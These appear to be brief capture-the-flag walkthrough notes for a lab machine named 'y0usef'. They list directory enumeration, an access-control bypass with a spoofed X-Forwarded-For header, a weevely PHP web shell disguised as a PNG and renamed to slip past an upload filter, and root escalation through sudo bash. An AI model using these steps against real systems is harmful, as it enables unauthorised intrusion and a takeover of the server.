## y0usef
```
ExportIP:  192 168.200.187
```


#### Enumeration

- wordlist : https://github.com/danielmiessler/SecLists
```
/administration
```


#### Bypass
- Setup
  -  `x-forwarded-for: localhost`


#### File Upload
- /administration/upload

#### weevely Reverse Shell
- Generate Web Shell
  - weevely generate 1234 newShell.png


#### Proxy
```
1. newShell.png -> newShell.php

2. weevely */administration/upload/file/{FILE}
```

#### USER & ROOT
- Read : `user.txt` && base64 -d
- Root : sudo /bin/bash

